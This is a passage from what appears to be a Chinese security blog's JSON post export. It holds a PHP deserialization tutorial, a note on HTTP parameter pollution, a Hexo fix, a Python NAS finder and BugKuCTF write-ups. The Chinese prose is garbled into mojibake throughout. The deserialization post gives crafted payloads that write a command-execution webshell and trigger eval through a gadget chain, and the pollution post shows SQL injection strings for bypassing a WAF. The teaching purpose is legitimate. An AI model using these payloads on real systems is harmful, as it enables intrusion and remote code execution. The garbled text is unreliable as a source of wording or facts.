è¿™é‡Œçš„Oä»£è¡¨çš„æ˜¯å­˜å‚¨å¯¹è±¡(Object),12åˆ™æ˜¯12ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨å¯¹è±¡é‡Œæœ‰12ä¸ªå­—ç¬¦ã€‚â€œfangxuliehuaâ€åˆ™æ˜¯å¯¹è±¡çš„åç§°ï¼Œè¿™é‡Œçš„1åˆ™ä»£è¡¨äº†**{s:4:â€œvar1â€;s:4:â€œtestâ€;}** é‡Œé¢æœ‰ä¸€ä¸ªå€¼ã€‚sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ4åˆ™é•¿åº¦ã€‚**â€œvar1â€**ä¸ºå­—ç¬¦ä¸²åå­—ï¼Œåé¢çš„ç›¸åŒ unserialize() ä¸ serialize() å¯¹åº”çš„ï¼Œunserialize()å¯ä»¥ä»å·²å­˜å‚¨çš„è¡¨ç¤ºä¸­åˆ›å»ºPHPçš„å€¼ï¼Œå•å°±æœ¬æ¬¡æ‰€å…³å¿ƒçš„ç¯å¢ƒè€Œè¨€ï¼Œå¯ä»¥ä»åºåˆ—åŒ–åçš„ç»“æœä¸­æ¢å¤å¯¹è±¡ï¼ˆobjectï¼‰ã€‚ &lt;?php class fanguxliehua{ public $var1=&quot;test&quot;; } $class= 'O:12:&quot;fangxuliehua&quot;:1:{s:4:&quot;var1&quot;;s:4:&quot;test&quot;;}'; print_r($class); echo &quot;&lt;/br&gt;&quot;; $class_unser=unserialize($class); print_r($class_unser); ?&gt; tips:è¿™é‡Œä½¿ç”¨unserialize()æ—¶ï¼Œä¼šè°ƒç”¨__wakeup()æˆå‘˜å‡½æ•° 0x02 ååºåˆ—åŒ–æ¼æ´äº§ç”ŸåŸå›  å½“ä¼ ç»™ unserialize() çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä»è€Œæ§åˆ¶å¯¹è±¡å†…éƒ¨çš„å˜é‡ç”šè‡³æ˜¯å‡½æ•°ã€‚ 0x03 åˆ©ç”¨å‡½æ•°æ„é€ PAYLOAD Magic function phpä¸­æœ‰ä¸€ç±»ç‰¹æ®Šçš„æ–¹æ³•å«&quot;é­”æ³•å‡½æ•°&quot;(Magic function)ï¼Œ è¿™é‡Œæˆ‘åˆ—å‡ºäº†ä¸ php(å)åºåˆ—åŒ–æœ‰å…³çš„å‡ ä¸ªé­”æ³•å‡½æ•°: __construct() //å½“ä¸€ä¸ªå¯¹è±¡åˆ›é€ æ—¶è¢«è°ƒç”¨ __destruct() //å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ __wakeup() //ä½¿ç”¨unserialize()æ—¶è§¦å‘ __sleep() //ä½¿ç”¨serialize()æ—¶è§¦å‘ __toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ è¿™é‡Œæˆ‘ä»¬ç€é‡å…³æ³¨ä¸€ä¸‹å‡ ä¸ªï¼š æ„é€ å‡½æ•°__construct()ï¼šå½“å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„ã€‚ ææ„å‡½æ•°__destruct()ï¼šå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ __wakeup() ï¼šå¦‚å‰æ‰€æï¼Œunserialize()æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ ä»£ç å¦‚ä¸‹: &lt;?php class test{ var $var='123'; function __wakeup(){ echo &quot;__wakeup&quot;.&quot;&lt;br&gt;&quot;; } function __construct(){ echo &quot;__construct&quot;.&quot;&lt;br&gt;&quot;; } function __destruct(){ echo &quot;__destruct&quot;.&quot;&lt;br&gt;&quot;; } } echo &quot;åºåˆ—åŒ–æ‰€è°ƒç”¨çš„å‡½æ•°:&quot;.&quot;&lt;br&gt;&quot;; $data=new test(); //æ ¹æ®testç±»å®åˆ—åŒ–å¯¹è±¡ $data=serialize($data); echo &quot;ååºåˆ—åŒ–æ‰€è°ƒç”¨çš„å‡½æ•°:&quot;.&quot;&lt;br&gt;&quot;; $data1=unserialize($data); print_r($data1); ?&gt; åˆ©ç”¨ç¤ºèŒƒ _wakeup() æˆ–__destruct() å‰é¢è¯´äº†åˆ©ç”¨éƒ½æ˜¯åŸºäºâ€œè‡ªåŠ¨è°ƒç”¨â€çš„magic functionã€‚ä»è€Œå½“æˆ‘ä»¬æ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶å¯ä»¥å»ç›´æ¥è§¦å‘å®ƒä»¬ã€‚ è¿™é‡Œé’ˆå¯¹ __wakeup() åœºæ™¯åšä¸ªå®éªŒã€‚å‡è®¾indexæºç å¦‚ä¸‹ï¼š &lt;?php class test{ var $test = 'test'; function __wakeup(){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); } } $class_get = $_GET['test']; print_r($class_get); echo &quot;&lt;/br&gt;&quot;; $class_get_unser = unserialize($class_get); include_once(&quot;webshell.php&quot;) //åŒ…å«ä¸€ä¸‹ï¼Œè®©å®ƒèƒ½æ˜¾ç¤ºæ•ˆæœ ?&gt; webshell.phpéœ€è¦è‡ªå·±å»ºç«‹ã€‚åœ¨åŒç›®å½•ä¸‹å»ºç«‹äº†ä¸€ä¸ªwebshell.phpï¼Œæœ€å…ˆè®¿é—®index.php åŸºæœ¬æ€è·¯æ˜¯ï¼Œé€šè¿‡serialize()å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¹‹åå†ä¼ è¿›å»ã€‚å‡è®¾æˆ‘ä»¬å·²çŸ¥index.phpæºç ã€‚æŠŠå¯¹è±¡ä¸­çš„$testèµ‹å€¼å†è°ƒç”¨unserialize()æ—¶ä¼šé€šè¿‡__wakeup()æŠŠ$testçš„å†™å…¥åˆ°shell.phpä¸­ã€‚ æˆ‘ä»¬å†™ä¸ªphpè„šæœ¬: class payload{ public $target=&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;; } $a =serialize(new payload); echo $a; åºåˆ—åŒ–åè¾“å‡º: O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&quot;;} s:33:&quot;&quot;é‡Œé¢æ²¡æœ‰payloadæˆ‘ä»¬è‡ªå·±å†™è¿›å»: tips:ä¸target=é‡Œé¢çš„?&gt;&quot;å‘ç”Ÿäº†å†²çªï¼Œè¿˜æœªæ‰¾åˆ°è§£å†³æ–¹æ¡ˆ O:7:&quot;payload&quot;:1:{s:4:&quot;test&quot;;s:33:&quot;&lt;?php $a=$_GET[cmd];system($a);?&gt;&quot;;} æ‰§è¡ŒæˆåŠŸï¼ å…¶ä»–Magic functionçš„åˆ©ç”¨ ä½†å¦‚æœä¸€æ¬¡unserialize()ä¸­å¹¶ä¸ä¼šç›´æ¥è°ƒç”¨çš„é­”æœ¯å‡½æ•°ï¼Œæ¯”å¦‚å‰é¢æåˆ°çš„__construct()ï¼Œæ˜¯ä¸æ˜¯å°±æ²¡æœ‰åˆ©ç”¨ä»·å€¼å‘¢ï¼Ÿå¹¶ä¸æ˜¯ã€‚ç„¶è€Œç±»ä¼¼äºPWNä¸­çš„ROPï¼Œæœ‰æ—¶å€™ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œç”±å®ƒè°ƒç”¨çš„__wakeup()ä¸­åˆå»è°ƒç”¨äº†å…¶ä»–çš„å¯¹è±¡ï¼Œç”±æ­¤å¯ä»¥æº¯æºè€Œä¸Šï¼Œåˆ©ç”¨ä¸€æ¬¡æ¬¡çš„â€œgadgetâ€æ‰¾åˆ°æ¼æ´ç‚¹ã€‚ class fangxuliehua_1{ function __construct($test){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); } } class fangxuliehua_2{ public $test='test'; function __wakeup(){ $obj=new fangxuliehua_1($this-&gt;test); } } $class_get = $_GET['test']; print_r($class_get); echo &quot;&lt;/br&gt;&quot;; $class_get_unser = unserialize($class_get); include_once(&quot;webshell.php&quot;);//åŒ…å«ä¸€ä¸‹ï¼Œè®©å®ƒèƒ½æ˜¾ç¤ºæ•ˆæœ è¿™é‡Œæˆ‘ä»¬ç»™testä¼ å…¥æ„é€ å¥½çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åï¼Œè¿›è¡Œååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup()å‡½æ•°ï¼Œä»è€Œåœ¨new fangxuliehua_1()ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡fangxuliehua_1ä¸­çš„__construct()æ–¹æ³•ï¼Œä»è€ŒæŠŠ&lt;?php phpinfo() ?&gt;å†™å…¥åˆ° webshell.phpä¸­ã€‚ O:14:&quot;fangxuliehua_2&quot;:1:{s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;} 0x04 åˆ©ç”¨æ™®é€šæˆå‘˜æ–¹æ³• å‰é¢è°ˆåˆ°çš„åˆ©ç”¨éƒ½æ˜¯åŸºäºâ€œè‡ªåŠ¨è°ƒç”¨â€çš„magic functionã€‚ä½†å½“æ¼æ´/å±é™©ä»£ç å­˜åœ¨ç±»çš„æ™®é€šæ–¹æ³•ä¸­ï¼Œå°±ä¸èƒ½æŒ‡æœ›é€šè¿‡â€œè‡ªåŠ¨è°ƒç”¨â€æ¥è¾¾åˆ°ç›®çš„äº†ã€‚è¿™æ—¶çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œå¯»æ‰¾ç›¸åŒçš„å‡½æ•°åï¼ŒæŠŠæ•æ„Ÿå‡½æ•°å’Œç±»è”ç³»åœ¨ä¸€èµ·ã€‚ &lt;?php class itishead{ public $test; function __construct(){ $this-&gt;test= new itisbody(); } function __destruct(){ $this-&gt;test-&gt;action(); } } class itisbody{ function action(){ echo &quot;hereisbody:)&quot;; } } class itisfoot{ public $test2; function action(){ eval($this-&gt;test2); } } $class = new itishead(); unserialize($_GET['test']); ?&gt; æœ¬æ„ä¸Šï¼Œnewä¸€ä¸ªæ–°çš„itisheadå¯¹è±¡åï¼Œè°ƒç”¨_construct()ï¼Œå…¶ä¸­åˆnewäº†itisbodyå¯¹è±¡ã€‚åœ¨ç»“æŸåä¼šè°ƒç”¨__destruct()ï¼Œå…¶ä¸­ä¼šè°ƒç”¨action()ï¼Œä»è€Œè¾“å‡º itisbodyã€‚ åˆ©ç”¨ä»£ç : &lt;?php class itishead { var $test; function __construct() { $this-&gt;test = new itisfoot(); } } class itisfoot { var $test2 = &quot;phpinfo();&quot;; } echo serialize(new itishead()); ?&gt; ç”Ÿæˆï¼š O:8:&quot;itishead&quot;:1:{s:4:&quot;test&quot;;O:8:&quot;itisfoot&quot;:1:{s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;}} æŠŠpayloadä¼ è¿›å»: åˆ©ç”¨æˆåŠŸï¼ å‚è€ƒé“¾æ¥:https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"æµ…è°ˆç»å…¸æ¼æ´HTTPå‚æ•°æ±¡æŸ“","slug":"httpå‚æ•°æ±¡æŸ“","date":"2019-09-24T00:00:00.000Z","updated":"2020-07-10T05:31:32.625Z","comments":true,"path":"2019/09/24/httpå‚æ•°æ±¡æŸ“/","link":"","permalink":"https://hu5k7.github.io/2019/09/24/httpå‚æ•°æ±¡æŸ“/","excerpt":"0x00 é—®é¢˜ç”±æ¥ åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä»HTTPå‚æ•°æ±¡æŸ“è¾¾æˆsqlæ³¨å…¥ã€‚ æœ‰ç‚¹ä¸ç†è§£HTTPå‚æ•°æ±¡æŸ“æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯å°±å»ç¿»äº†ä¸€äº›èµ„æ–™å’Œçœ‹äº†è§†é¢‘è¿‡æ¥æ€»ç»“ä¸€ä¸‹ã€‚","text":"0x00 é—®é¢˜ç”±æ¥ åœ¨å…ˆçŸ¥ç¤¾åŒºçœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œä»HTTPå‚æ•°æ±¡æŸ“è¾¾æˆsqlæ³¨å…¥ã€‚ æœ‰ç‚¹ä¸ç†è§£HTTPå‚æ•°æ±¡æŸ“æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯å°±å»ç¿»äº†ä¸€äº›èµ„æ–™å’Œçœ‹äº†è§†é¢‘è¿‡æ¥æ€»ç»“ä¸€ä¸‹ã€‚ 0x01 ä»€ä¹ˆæ˜¯HTTPå¸¸æ•°æ±¡æŸ“ HTTPå‚æ•°æ±¡æŸ“ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ç»™ä¸€ä¸ªå‚æ•°é™„ä¸Šä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šçš„valueã€‚å¯¹äºä¸åŒçš„å¼•æ“å¼•ç”¨çš„valueä¼šä¸åŒã€‚ å‡è®¾: å¦‚æœæ˜¯jsp+tomcat è¿”å›çš„è¯·æ±‚æ˜¯ç¬¬ä¸€ä¸ªvalueï¼Œ å¦‚æœphp+apache è¿”å›çš„è¯·æ±‚æ˜¯ç¬¬äºŒä¸ªvalueï¼Œ å¦‚æœæ˜¯asp+iis åˆ™ä¼šè¿”å›ä¸¤ä¸ªä¸€èµ·çš„value 0x02 ä¸€äº›ä¾‹å­ 1.å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç½‘ç«™http://hacker.net/ http://hacker.net/search.php?page=10&amp;page=hacker å½“æœåŠ¡å™¨é‡åˆ°åŒä¸€ä¸ªå‚æ•°èµ‹å€¼ä¸åŒæ•°å€¼æ—¶ï¼Œä¼šå°†ä»–ä»¬è¿æ¥èµ·æ¥ï¼Œhackerå¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥ç»•è¿‡é»‘åå•ä¾‹å¦‚ http://hacker.net/search.php?page=select 1&amp;page=2,3,database() ä¸æ˜¯åœ¨é»‘åå•ä¸­çš„æ¨¡å¼ï¼Œä¸ä¼šè§¦å‘é»‘åå•çš„æ‹¦æˆªåŠŸèƒ½ï¼Œå…¶æ¬¡ï¼Œç”±äºwebç¨‹åºä¼šé‡‡å–è¿æ¥æ“ä½œï¼Œå°†å‰åçš„å†…å®¹è¿æ¥èµ·æ¥ï¼ŒSQLæ³¨å…¥è¡Œä¸ºæ‰èƒ½å¤Ÿè¢«æ‰§è¡Œ 0x03 æ³¨å…¥å’ŒHTTPå‚æ•°æ±¡æŸ“æœ‰ä»€ä¹ˆå…³ç³» å¦‚æœè¯¥ç½‘ç«™æ˜¯é‡‡ç”¨ä¸¤ä¸ªä¸€èµ·çš„valueä¸€èµ·è¿”å›ï¼Œåˆ™å¯ä»¥ç”¨äºBypass WAFï¼Œä¹Ÿå¯ä»¥ç”¨äºXSS. æœ€ç»ˆå–å†³äºwebæœåŠ¡å™¨ 0x04 ç»“å°¾ ç»å…¸çš„æ¼æ´ä¸ä»£è¡¨ç°åœ¨æ²¡æœ‰ï¼Œå¯ä»¥ç»“åˆä¸€äº›payloadæ¥è¾¾æˆè¿‡WAFã€‚ tips:æœ‰ç‚¹å°ä¹±ã€‚æˆ‘çœ‹äº†ä¹Ÿæœ‰ç‚¹è¿·èŒ«äº†xD å‚è€ƒé“¾æ¥:https://v.qq.com/x/page/k0870cdqlsb.html è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Hexoæ’å…¥å›¾ç‰‡é—®é¢˜çš„æ€»ç»“","slug":"Hexoæ’å…¥å›¾ç‰‡é—®é¢˜çš„æ€»ç»“","date":"2019-09-18T00:00:00.000Z","updated":"2020-07-10T05:31:29.491Z","comments":true,"path":"2019/09/18/Hexoæ’å…¥å›¾ç‰‡é—®é¢˜çš„æ€»ç»“/","link":"","permalink":"https://hu5k7.github.io/2019/09/18/Hexoæ’å…¥å›¾ç‰‡é—®é¢˜çš„æ€»ç»“/","excerpt":"0x00 èµ·å› : æ’å…¥å›¾ç‰‡çš„æ—¶å€™hexo-asset-image æ’ä»¶ä¼šåœ¨å›¾ç‰‡çš„è·¯å¾„å‰é¢è‡ªåŠ¨æ·»åŠ /.io/","text":"0x00 èµ·å› : æ’å…¥å›¾ç‰‡çš„æ—¶å€™hexo-asset-image æ’ä»¶ä¼šåœ¨å›¾ç‰‡çš„è·¯å¾„å‰é¢è‡ªåŠ¨æ·»åŠ /.io/ 0x01 ç»è¿‡äº†ä¸€ç³»åˆ—çš„æµ‹è¯•æ‰¾å‡ºäº†ä¸€ä¸‹å‡ ä¸ªé—®é¢˜: é—®é¢˜1 Hexoç‰ˆæœ¬ä»¥åŠæ’ä»¶ä¸æ˜¯æœ€æ–° hexo v é—®é¢˜2 æ²¡æœ‰ç”¨hexo n &quot;string&quot; æ–°å¢æ–‡ç« ã€‚ é—®é¢˜3 å›¾ç‰‡è·¯å¾„çš„**æ–œæ†**é—®é¢˜ (/)æ­£æ–œæ†å’Œ( \\)åæ–œæ†, å¦‚æœå›¾ç‰‡æ˜¯ç›´æ¥è„±è¿›Makedownï¼Œå®ƒä¼šå†™è·¯å¾„çš„æ˜¯åæ–œæ† ![]xx\\xx.png ä¼šè®©hexo-asset-imageæ’ä»¶ è‡ªåŠ¨è¯†åˆ«æˆï¼ŒåŠ ä¸€ä¸ªåå­— æ­£å¸¸çš„ï¼šBugKuCTF/xx.png é”™è¯¯çš„ï¼šBugKuCTF/BugKuCTFxx.png çº¢è‰² æ˜¯é”™çš„ è“è‰² æ˜¯å¯¹çš„ é—®é¢˜4 å¦‚æœåœ¨æ—§ç‰ˆæœ¬çš„Hexoå®‰è£…è¿‡ï¼Œhexo-asset-image æ’ä»¶ é‚£å°±éœ€è¦é‡è£…ä¸€é npm remove hexo-asset-image npm install hexo-asset-image --save é—®é¢˜5 è¿™ä¸ªé—®é¢˜æˆ‘ä¸çŸ¥é“æ˜¯ä¸æ˜¯æ‰€æœ‰äººéƒ½ä¼šã€‚åœ¨makedownä¸‹ï¼Œä¸åŒºåˆ†è·¯å¾„å¤§å°å†™ï¼Œåœ¨hexoä¸Šä¼ åç½‘é¡µä¸ŠåŒºåˆ†å¤§å°å†™ 0x02 æœ€ç›´æ¥æœ€æ¥åœ°æ°”è§£å†³é—®é¢˜çš„åŠæ³• å°±æ˜¯å»ä¿®æ”¹æ’ä»¶æºä»£ç  ä½ç½®: node_modules\\hexo-asset-image\\index.js tips: è¿™æ˜¯æˆ‘ä¸ªäººåšå®¢hexoæ’å…¥å›¾ç‰‡æ—¶å‡ºé”™çš„é—®é¢˜,æˆ‘ç”¨çš„Makedownæ˜¯Typoraï¼Œä¸åŒçš„ä¸»é¢˜æœ‰ä¸ä¸€æ ·çš„æ¸²æŸ“å›¾ç‰‡è·¯å¾„çš„æ–¹å¼ï¼Œæ ¹æ®ä¸åŒçš„æ–¹å¼å»ä¿®æ”¹æ’ä»¶ä»£ç ã€‚æœ‰èƒ½åŠ›å¯ä»¥è‡ªå·±å†™æ’ä»¶=w= è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"PythonScript:Search_loaclNAS","slug":"æœ¬åœ°NASæ‰«æ","date":"2019-06-20T00:00:00.000Z","updated":"2020-07-10T05:30:48.702Z","comments":true,"path":"2019/06/20/æœ¬åœ°NASæ‰«æ/","link":"","permalink":"https://hu5k7.github.io/2019/06/20/æœ¬åœ°NASæ‰«æ/","excerpt":"0x00 ä»‹ç» æ¯æ¬¡éƒ½ä¼šæŠ˜è…¾ä¸€ä¸‹å®è®­å®¤çš„ è½¯è·¯ç”±ã€‚ä¸æ˜¯æ¢linuxå°±æ˜¯åæ‰æœºå­ï¼Œå¶å°”è¿˜å¿˜è®°NASé…çš„å›ºå®šIPã€‚ æ‰€ä»¥å†™ä¸‹äº†æŸ¥æ‰¾æœ¬åœ°NASè„šæœ¬ã€‚","text":"0x00 ä»‹ç» æ¯æ¬¡éƒ½ä¼šæŠ˜è…¾ä¸€ä¸‹å®è®­å®¤çš„ è½¯è·¯ç”±ã€‚ä¸æ˜¯æ¢linuxå°±æ˜¯åæ‰æœºå­ï¼Œå¶å°”è¿˜å¿˜è®°NASé…çš„å›ºå®šIPã€‚ æ‰€ä»¥å†™ä¸‹äº†æŸ¥æ‰¾æœ¬åœ°NASè„šæœ¬ã€‚ import socket import re import threading print(&quot;&quot;&quot; [æœç´¢æœ¬åœ°NAS-Version 0.1]\\né»˜è®¤æ‰«ææœ€åä¸€ä¸ªç½‘æ®µ1.1.1./24 &quot;&quot;&quot;) host = input(&quot;æœ¬åœ°IP&gt;&quot;) def searchNAS(i): ip = host+str(i) try: Hostname = socket.gethostbyaddr(ip) match = re.search(r'NAS-SERVER',str(Hostname)).group() if match == &quot;NAS-SERVER&quot;: print(&quot;NASæœåŠ¡å™¨IPåœ°å€ä¸º &gt; {}:{}&quot;.format(match,ip)) pass except: pass for i in range(0,256): t = threading.Thread(target=searchNAS,args=(i, )) t.start() å±€åŸŸç½‘å†…æ˜¯DHCPä¼šæ¯å¤©ä¼šæ›´æ¢IPï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å°±åšäº†ä¸€ä¸ªæœ¬åœ°NASçš„ipæœç´¢å™¨ã€‚æ–¹ä¾¿è‡ªå·±æ‰¾åˆ°å­˜å‚¨æœåŠ¡å™¨ğŸ˜— è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€BugKuCTFã€‘é¶åœºéƒ¨åˆ†writeup","slug":"BugKuCTF","date":"2019-05-20T00:00:00.000Z","updated":"2020-07-10T05:31:03.131Z","comments":true,"path":"2019/05/20/BugKuCTF/","link":"","permalink":"https://hu5k7.github.io/2019/05/20/BugKuCTF/","excerpt":"0x00 ä»‹ç» å¼€å§‹åšä¸€äº›CTFé¢˜ç›®äº†ã€‚æ‰“ç®—åœ¨é«˜èŒæ¯”èµ›ç©ç©CTFxD","text":"0x00 ä»‹ç» å¼€å§‹åšä¸€äº›CTFé¢˜ç›®äº†ã€‚æ‰“ç®—åœ¨é«˜èŒæ¯”èµ›ç©ç©CTFxD åœ°å€:https://ctf.bugku.com/challenges WEBç¯‡ [web2] è¿™ç§ç±»å‹ç›´æ¥çœ‹æºç  F12æˆ–è€…Ctrl+U [è®¡ç®—å™¨]------------------------------------------------------ è¯•ç€ç®—å‡ºæ¥,ç„¶åå‘ç°åªèƒ½è¾“å…¥ä¸€ä½æ•°ï¼Œå°±èƒ½çŒœæµ‹åˆ°ä»–é™åˆ¶äº†é•¿åº¦ï¼Œæ¥ç€æˆ‘ä»¬è·‘åˆ°F12é‡Œé¢å»ä¿®æ”¹å³å¯ [webåŸºç¡€$_GET]------------------------------------------------------ ä¸è§£é‡Šï¼Œç›´æ¥çœ‹ä»£ç  [webåŸºç¡€$_POST]------------------------------------------------------ ä¹Ÿä¸è§£é‡Šï¼Œç›´æ¥çœ‹ä»£ç ï¼Œéœ€è¦ç”¨åˆ°æŠ“åŒ…è½¯ä»¶ [çŸ›ç›¾]------------------------------------------------------ å…ˆçœ‹ä»£ç  é—®é¢˜å‡ºç°åœ¨ is_numeric è¿™ä¸ªå‡½æ•°,is_numeric æ˜¯åˆ¤æ–­ ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸ºæ•°å­—ã€‚å¦‚æœæ˜¯åˆ™ä¸è¾“å‡º,ä¸æ˜¯åˆ™è¾“å‡º$numã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚ ä»–åˆ¤æ–­çš„æ˜¯æ•°å­—é‚£ä¹ˆæˆ‘ä»¬ç»™ä»–åŠ ç‚¹å­—ç¬¦ä¸² ?num=1aï¼Œåˆ™ç»•è¿‡äº†ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œå¹¶è·³åˆ°äº†ç¬¬äºŒä¸ªifåˆ¤æ–­ã€‚ ç„¶åä»–ç°åœ¨ç›´æ¥æ˜¾ç¤ºå‡ºäº†flag. [web3]--------------------------------------------------- ä»–ä¼šä¸€ç›´å¼¹çª—å‡ºæ¥ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„Chromeä¸ä¼šè·³å‡ºæ¥ã€‚ æ¥ç€æˆ‘ä»¬ç›´æ¥çœ‹æºç F12 æˆ–è€… Ctrl+Uï¼Œå‘ç°æœ€ä¸‹é¢æœ‰ä¸€ä¸ªè¢«æ³¨é‡Šçš„htmlç¼–ç  æˆ‘çš„æ–¹æ³•æ˜¯ï¼Œç¼–å†™åˆ°æ–‡æœ¬ï¼Œæ¢htmlæ ¼å¼æ‰“å¼€ã€‚ è§£ç å°±å‡ºæ¥äº†. [åŸŸåè§£æ]------------------------------------------------- ä¿®æ”¹hostsè®¿é—® flag.baidu.comå³å¯. hostsä½ç½® windowsï¼š C:\\Windows\\System32\\drivers\\etc linux: /etc/hosts [ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥]-------------------------------------------- æ‰“å¼€ç½‘å€å‘ç°ä»–ä¸€ç›´åˆ·æ–°ã€‚äºŒè¯ä¸è¯´ç›´æ¥ä¸ŠBurpsuiteæŠ“åŒ…ï¼Œå¹¶æ”¾åˆ°Repeater(Ctrl+R)ã€‚ å¤šGoå‡ éå°±èƒ½çœ‹åˆ°flagäº† [æœ¬åœ°æ–‡ä»¶åŒ…å«]-------------------------------------------------- ç½‘ç«™è¿›ä¸å»ã€‚æ”¾å¼ƒ. [å˜é‡1]------------------------------------------------------ å…ˆçœ‹å®¡è®¡ä»£ç ï¼Œå‘ç°æœ€ä¸‹é¢æœ‰ä¸¤ä¸ª$$args $$ å®¹æ˜“å¼•å‘å˜é‡è¦†ç›– æ€è€ƒã€‚æˆ‘ä»¬ç›´æ¥è®©ä»–å…¨éƒ¨å€¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä½¿ç”¨å…¨å±€å˜é‡$GLOBALS æˆ‘ä»¬ç›´æ¥ç»™ä»– å…¨å±€å˜é‡$GLOBALSä¼ å‚è¿›å»,args=GLOBALS tips:å…³äºå…¨å±€å˜é‡https://www.runoob.com/php/php-superglobals.html [web5]---------------------------------------------------- è¾“å…¥å­—ç¬¦ä¸²,å•¥ä¸œè¥¿éƒ½æ²¡æœ‰ ç›´æ¥çœ‹çœ‹æºç F12 æˆ–è€… Ctrl+U å‘ç°è¿™ä¸€ä¸²çœ‹ä¸æ‡‚çš„ç¼–ç ã€‚è¿™ç§ç¼–ç æ˜¯JSFUCKå±äºä¸€ç›´ åŠ å¯†æ–¹å¼ tips:åŸç†https://blog.csdn.net/qq_36539075/article/details/79946099 ç›´æ¥F12åœ¨Consoleé‡Œç²˜è´´ [å¤´ç­‰èˆ±]------------------------------------------------------ ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ åœ¨çœ‹ä¸‹å¤´ç­‰èˆ±ã€‚å°±èƒ½çŒœæµ‹åˆ°ä»–flagè‚¯å®šåœ¨ è¯·æ±‚å¤´é‚£è¾¹ï¼Œäºæ˜¯ç›´æ¥ä¸ŠæŠ“åŒ…è½¯ä»¶ï¼Œå¹¶GOä¸€éçœ‹çœ‹ æ‹¿åˆ°flagï¼ [ç½‘ç«™è¢«é»‘]------------------------------------------------------ æ‰“å¼€ç½‘ç«™ã€‚å¥½ç‚«å•Šã€‚è¿˜ä¼šè·Ÿç€é¼ æ ‡åŠ¨ï¼Œå¥½ï¼å·ä»£ç ä¸‹æ¥äº† å•¥ä¹Ÿæ²¡æç¤ºã€‚ç›´æ¥ä¸Šå¾¡å‰‘æ‰«ææ‰¾åˆ°ä¸€ä¸ªã€‚shellçš„è·¯å¾„ 